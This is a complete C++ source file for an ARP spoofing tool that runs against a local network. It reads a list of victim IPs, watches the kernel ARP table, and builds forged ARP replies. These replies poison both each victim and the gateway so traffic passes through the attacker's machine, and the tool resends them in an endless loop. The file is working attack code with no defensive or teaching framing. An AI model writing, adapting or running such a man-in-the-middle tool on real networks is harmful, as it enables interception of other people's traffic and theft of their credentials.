//============================================================================
// Name        : my_arp_spoof2.cpp
// Author      : 
// Version     :
// Copyright   : Your copyright notice
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <net/if.h>           // struct ifreq
#include <linux/if_ether.h>   // ETH_P_ARP = 0x0806
#include <linux/if_packet.h>  // struct sockaddr_ll (see man 7 packet)
#include <net/ethernet.h>
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>        // inet_pton() and inet_ntop()
#include <time.h>

#define IP4_LEN_STR_MAX_PLUS_NEW_LINE 17
#define MAC_LEN_STR_MAX 18
#define STR_FILE_NAME "/root/myarpspoof/IPs.txt"

struct _IPsMacs
{
	char ip[IP4_LEN_STR_MAX_PLUS_NEW_LINE];
	char mac[MAC_LEN_STR_MAX];
	unsigned char mac_bin[6];
	unsigned char last_status; //0 not found, 1 - found
	unsigned int m_arp_status_flag; //0 - incomplete, 2 or 6 - found
	unsigned char arp_frame_2victim[42];
	unsigned char arp_frame_2gateway[42];
};
_IPsMacs IPsMacs[256];
unsigned ui_IPsMacsCountRead = 0;
unsigned char g_binMAC_of_eth[6];
int g_Raw_Socket, g_udp_sock;
sockaddr_ll g_dev_to_send;
sockaddr_in g_sin;
in_addr_t ip_of_eth;
char g_strGateWayIP[IP4_LEN_STR_MAX_PLUS_NEW_LINE - 1];
char g_strGateWayMAC[MAC_LEN_STR_MAX];
char g_str_eth[16];

//#define TRACE(Arg...)	printf( Arg );printf( "\n" );
#define TRACE(Arg...)

void LogMsg(char* pMsg)
{
	char timestr[128];
	struct tm tm;
	time_t t = time(NULL);
	localtime_r(&t, &tm);
	strftime(timestr, sizeof(timestr), "%Y.%m.%d-%T", &tm);

	fprintf(stdout, "%s - %s\n", timestr, pMsg);
}

void ReadIPsFromFile()
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	FILE *pFileIPs = fopen(STR_FILE_NAME, "r");
	if (pFileIPs == NULL)
	{
		fprintf(stderr, "File '" STR_FILE_NAME "' not found\n");
		exit(1);
	}

	for (unsigned long ulTmp = 0; ulTmp < sizeof(IPsMacs) / sizeof(IPsMacs[0]);
			ulTmp++)
	{
		if (0
				== fgets((char*) IPsMacs[ulTmp].ip, sizeof(_IPsMacs::ip),
						pFileIPs))
			break;
		if (IPsMacs[ulTmp].ip[strlen(IPsMacs[ulTmp].ip) - 1] == '\n')
			IPsMacs[ulTmp].ip[strlen(IPsMacs[ulTmp].ip) - 1] = 0;
		IPsMacs[ulTmp].last_status = 0;
		IPsMacs[ulTmp].m_arp_status_flag = 111;
		ui_IPsMacsCountRead++;
	}
	fclose(pFileIPs);
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

typedef struct _arp_hdr arp_hdr;
struct _arp_hdr
{
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};

void Create_and_Send_ARP_RequestFrame(const char* strIP_target)
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
#define ETH_HDRLEN 14      // Ethernet header length
#define IP4_HDRLEN 20      // IPv4 header length
#define ARP_HDRLEN 28      // ARP header length
#define ARPOP_REQUEST 1    // Taken from <linux/if_arp.h>

	unsigned char ether_frame[IP_MAXPACKET];
	arp_hdr arphdr;
	arphdr.htype = htons(1);
	// Protocol type (16 bits): 2048 for IP
	arphdr.ptype = htons(ETH_P_IP);
	// Hardware address length (8 bits): 6 bytes for MAC address
	arphdr.hlen = 6;
	// Protocol address length (8 bits): 4 bytes for IPv4 address
	arphdr.plen = 4;
	// OpCode: 1 for ARP request
	arphdr.opcode = htons(ARPOP_REQUEST);
	// Sender hardware address (48 bits): MAC address
	memcpy(&arphdr.sender_mac, g_binMAC_of_eth, 6);
	memcpy(&arphdr.sender_ip, &ip_of_eth, 4);

	int status;
	if ((status = inet_pton(AF_INET, strIP_target, &arphdr.target_ip)) != 1)
	{
		fprintf(stderr,
				"inet_pton() failed for source IP address.\nError message: %s",
				strerror(status));
		exit(EXIT_FAILURE);
	}
	// Sender protocol address (32 bits)
	// See getaddrinfo() resolution of src_ip.

	//without it the arp table in kernel does not applies an arp response
	memcpy(&g_sin.sin_addr.s_addr, &arphdr.target_ip, 4);
	if (sendto(g_udp_sock, NULL, 0, 0, (struct sockaddr *) &g_sin, sizeof(g_sin)) < 0)
	{
		fprintf(stderr, "sendto failed on line %d", __LINE__);
		exit(EXIT_FAILURE);
	}

	// Target hardware address (48 bits): zero, since we don't know it yet.
	memset(&arphdr.target_mac, 0, 6 * sizeof(uint8_t));

	// Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
	unsigned frame_length = 6 + 6 + 2 + ARP_HDRLEN;

	// Destination and Source MAC addresses
	memset(ether_frame, 0xFF, 6 * sizeof(uint8_t));
	memcpy(ether_frame + 6, g_strGateWayMAC, 6 * sizeof(uint8_t));

	// Next is ethernet type code (ETH_P_ARP for ARP).
	// http://www.iana.org/assignments/ethernet-numbers
	ether_frame[12] = ETH_P_ARP / 256;
	ether_frame[13] = ETH_P_ARP % 256;

	// Next is ethernet frame data (ARP header).

	// ARP header
	memcpy(ether_frame + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));

	int sent;
	if ((sent = sendto(g_Raw_Socket, ether_frame, frame_length, 0,
			(struct sockaddr *) &g_dev_to_send, sizeof(g_dev_to_send))) <= 0)
	{
		perror("sendto() failed");
		exit(EXIT_FAILURE);
	}
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

void CreateSockets()
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	if ((g_Raw_Socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("socket() failed ");
		exit(EXIT_FAILURE);
	}

	memset(&g_dev_to_send, 0, sizeof(g_dev_to_send));
	if ((g_dev_to_send.sll_ifindex = if_nametoindex(g_str_eth)) == 0)
	{
		perror("if_nametoindex() failed to obtain interface index ");
		exit(EXIT_FAILURE);
	}

	memset(&g_sin, 0, sizeof(g_sin));
	g_sin.sin_family = AF_INET;
	g_sin.sin_port = htons(67);
	if ((g_udp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		exit(EXIT_FAILURE);
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

void GetMAC_ofEth(const char* ifName, unsigned char* pMAC_Bin)
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	ifreq ifr;
	int sd;
	// Submit request for a socket descriptor to look up interface.
	if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		perror("socket() failed to get socket descriptor for using ioctl() ");
		exit(EXIT_FAILURE);
	}

	// Use ioctl() to look up interface name and get its MAC address.
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, ifName);
	ifr.ifr_addr.sa_family = AF_INET;
	if (ioctl(sd, SIOCGIFHWADDR, &ifr) < 0)
	{
		perror("ioctl() failed to get source MAC address ");
		exit(2);
	}
	memcpy(pMAC_Bin, ifr.ifr_hwaddr.sa_data, 6);

	if (ioctl(sd, SIOCGIFADDR, &ifr) < 0)
	{
		perror("ioctl() failed to get source IP address ");
		exit(2);
	}
	ip_of_eth = ((sockaddr_in*) &ifr.ifr_addr)->sin_addr.s_addr;
	close(sd);
	printf(
			"Using net interface: %s, IP=%s, MAC=%02X:%02X:%02X:%02X:%02X:%02X\n",
			ifName, inet_ntoa(*(in_addr*) &ip_of_eth), pMAC_Bin[0], pMAC_Bin[1],
			pMAC_Bin[2], pMAC_Bin[3], pMAC_Bin[4], pMAC_Bin[5]);

	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

void DoARP_Spoof_Host(_IPsMacs* pArpEntry)
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	//printf("dolbim %s, kotoryj na %s\n", pArpEntry->ip, pArpEntry->mac);

	if (sendto(g_Raw_Socket, pArpEntry->arp_frame_2victim, 42, 0,
			(struct sockaddr *) &g_dev_to_send, sizeof(g_dev_to_send)) <= 0)
	{
		perror("sendto() failed");
		exit(EXIT_FAILURE);
	}
	if (sendto(g_Raw_Socket, pArpEntry->arp_frame_2gateway, 42, 0,
			(struct sockaddr *) &g_dev_to_send, sizeof(g_dev_to_send)) <= 0)
	{
		perror("sendto() failed");
		exit(EXIT_FAILURE);
	}
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

void CreatePacketToGateway(_IPsMacs* pArpEntry)
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	unsigned char binGateWayMAC[6];
	if (6
			!= sscanf((const char *) g_strGateWayMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
					&binGateWayMAC[0],
					&binGateWayMAC[1],
					&binGateWayMAC[2],
					&binGateWayMAC[3],
					&binGateWayMAC[4],
					&binGateWayMAC[5]))
	{
		fprintf(stderr, "%s, sscanf failed at line %d", __PRETTY_FUNCTION__, __LINE__);
		exit(2);
	}
	memcpy(pArpEntry->arp_frame_2gateway, binGateWayMAC, 6);
	memcpy(pArpEntry->arp_frame_2gateway + 6, g_binMAC_of_eth, 6);
	unsigned char arp_header_stuff[] =
	{ 8, 6, 0, 1, 8, 0, 6, 4, 0, 2 };
	memcpy(pArpEntry->arp_frame_2gateway + 6 + 6, arp_header_stuff,
			sizeof(arp_header_stuff));
	memcpy(pArpEntry->arp_frame_2gateway + 6 + 6 + sizeof(arp_header_stuff),
			g_binMAC_of_eth, 6);
	if (inet_pton(AF_INET, pArpEntry->ip,
			pArpEntry->arp_frame_2gateway + 6 + 6 + sizeof(arp_header_stuff)
					+ 6) != 1)
	{
		fprintf(stderr, "inet_pton() failed");
		exit(EXIT_FAILURE);
	}
	memcpy(
			pArpEntry->arp_frame_2gateway + 6 + 6 + sizeof(arp_header_stuff) + 6
					+ 4, binGateWayMAC, 6);
	if (inet_pton(AF_INET, g_strGateWayIP,
			pArpEntry->arp_frame_2gateway + 6 + 6 + sizeof(arp_header_stuff) + 6
					+ 4 + 6) != 1)
	{
		fprintf(stderr, "inet_pton() failed");
		exit(EXIT_FAILURE);
	}
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

void CreatePacketToVictim(_IPsMacs* pArpEntry)
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	if (6
			!= sscanf((const char *) pArpEntry->mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
					&pArpEntry->mac_bin[0],
					&pArpEntry->mac_bin[1],
					&pArpEntry->mac_bin[2],
					&pArpEntry->mac_bin[3],
					&pArpEntry->mac_bin[4],
					&pArpEntry->mac_bin[5]))
	{
		fprintf(stderr, "%s, sscanf failed at line %d", __PRETTY_FUNCTION__, __LINE__);
		exit(2);
	}
	memcpy(pArpEntry->arp_frame_2victim, pArpEntry->mac_bin, 6);
	memcpy(pArpEntry->arp_frame_2victim + 6, g_binMAC_of_eth, 6);
	unsigned char arp_header_stuff[] =
	{ 8, 6, 0, 1, 8, 0, 6, 4, 0, 2 };
	memcpy(pArpEntry->arp_frame_2victim + 6 + 6, arp_header_stuff,
			sizeof(arp_header_stuff));
	memcpy(pArpEntry->arp_frame_2victim + 6 + 6 + sizeof(arp_header_stuff),
			g_binMAC_of_eth, 6);
	if (inet_pton(AF_INET, g_strGateWayIP,
			pArpEntry->arp_frame_2victim + 6 + 6 + sizeof(arp_header_stuff) + 6)
			!= 1)
	{
		fprintf(stderr, "inet_pton() failed");
		exit(EXIT_FAILURE);
	}
	memcpy(
			pArpEntry->arp_frame_2victim + 6 + 6 + sizeof(arp_header_stuff) + 6
					+ 4, pArpEntry->mac_bin, 6);
	if (inet_pton(AF_INET, pArpEntry->ip,
			pArpEntry->arp_frame_2victim + 6 + 6 + sizeof(arp_header_stuff) + 6
					+ 4 + 6) != 1)
	{
		fprintf(stderr, "inet_pton() failed");
		exit(EXIT_FAILURE);
	}
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

void DoARP_Spoof()
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	char log_buf[200];
	FILE* fp_proc_net_arp;
	if ((fp_proc_net_arp = fopen("/proc/net/arp", "r")))
	{
		char strLine[200];
		fgets(strLine, sizeof(strLine), fp_proc_net_arp); //skip header, first line
		while (fgets(strLine, sizeof(strLine), fp_proc_net_arp))
		{
			char tmp_ip[IP4_LEN_STR_MAX_PLUS_NEW_LINE];
			char tmp_mac[MAC_LEN_STR_MAX];

			TRACE("Processing line: '%s'", strLine);
			unsigned int arp_status_flag; //0x0 incomplete, 0x2 complete, 0x6 complete and manually set
			if (3
					!= sscanf(strLine, "%s %*s %x %s %*s %*s\n", tmp_ip,
							&arp_status_flag, tmp_mac))
			{
				perror("error parsing /proc/net/arp");
				exit(2);
			}
			for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
			{
				if (0 == strcmp(tmp_ip, IPsMacs[i].ip))
				{
					if (0
							!= memcmp(tmp_mac, "00:00:00:00:00:00",
									sizeof("00:00:00:00:00:00")))
					{ //we have an entry

						if (0x0 != arp_status_flag)
						{ //current status of host is alive
						  //MAC of IP changed
							if (0 == IPsMacs[i].last_status)
							{
								if (0 != strcasecmp(tmp_mac, IPsMacs[i].mac))
								{
									snprintf(log_buf, sizeof(log_buf),
											"%s -> %s", tmp_mac,
											IPsMacs[i].ip);
								}
								else
								{
									snprintf(log_buf, sizeof(log_buf),
											"%s -> %s (found again)", tmp_mac,
											IPsMacs[i].ip);
								}
								LogMsg(log_buf);
								strcpy(IPsMacs[i].mac, tmp_mac);
								CreatePacketToGateway(&IPsMacs[i]);
								CreatePacketToVictim(&IPsMacs[i]);
								IPsMacs[i].last_status = 1;
							}
							else
							{
								if (0 != strcasecmp(tmp_mac, IPsMacs[i].mac))
								{
									snprintf(log_buf, sizeof(log_buf),
											"%s leased to another device %s",
											IPsMacs[i].ip, tmp_mac);
									LogMsg(log_buf);
								}
								strcpy(IPsMacs[i].mac, tmp_mac);
							}
							DoARP_Spoof_Host(&IPsMacs[i]);
						}//if (0x0 != arp_status_flag)
						else
						{//arp status incomplete
							if (1 == IPsMacs[i].last_status)
							{
								snprintf(log_buf, sizeof(log_buf),
										"%s is disappeared from %s", tmp_mac,
										IPsMacs[i].ip);
								LogMsg(log_buf);
								IPsMacs[i].last_status = 0;
							}
						}
					}//memcmp(tmp_mac, "00:00:00:00:00:00",...
				}//if (0 == strcmp(tmp_ip, IPsMacs[i].ip))
			}//for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
		}//while (fgets(strLine, sizeof(strLine), fp_proc_net_arp))
	}//if ((fp_proc_net_arp = fopen("/proc/net/arp", "r")))
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

void SendARP_Requests()
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
		Create_and_Send_ARP_RequestFrame(IPsMacs[i].ip);
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

void ParseCmdLineParameters(int argc, char **argv)
{
	TRACE("Entered %s", __PRETTY_FUNCTION__);
	if (argc != 7)
	{
		fprintf(stderr, "Usage: %s -i eth0 -g 192.168.0.1 -m 10:FE:11:11:11:11\n",
				argv[0]);
		exit(EXIT_FAILURE);
	}
	int opt;
	while ((opt = getopt(argc, argv, "i:g:m:")) != -1)
	{
		switch (opt)
		{
		case 'i': // interface
		{
			strcpy(g_str_eth, optarg);
		}
			break;

		case 'g': // target IP
		{
			// check IP format
			unsigned int tTarget_IP = inet_addr(optarg);
			if ((unsigned int) -1 == tTarget_IP)
			{
				fprintf(stderr, "Invalid gateway IP: -g %s", optarg);
				exit(EXIT_FAILURE);
			}
			strcpy(g_strGateWayIP, optarg);
		}
			break;

		case 'm': // target IP
		{
			strcpy(g_strGateWayMAC, optarg);
		}
			break;

		default:
			fprintf(stderr,
					"Usage: myarpspoof -i st2770.0 -g 192.168.0.1 -m 10:fe:ed:e5:c2:b4\n");
			break;
		}
	}
	TRACE("Leave %s", __PRETTY_FUNCTION__);
}

int main(int argc, char* argv[])
{
	ParseCmdLineParameters(argc, argv);

	CreateSockets();
	ReadIPsFromFile();
	GetMAC_ofEth(g_str_eth, g_binMAC_of_eth);

	while (1)
	{
		SendARP_Requests();
		sleep(2);
		DoARP_Spoof();
	}
	return 0;
}
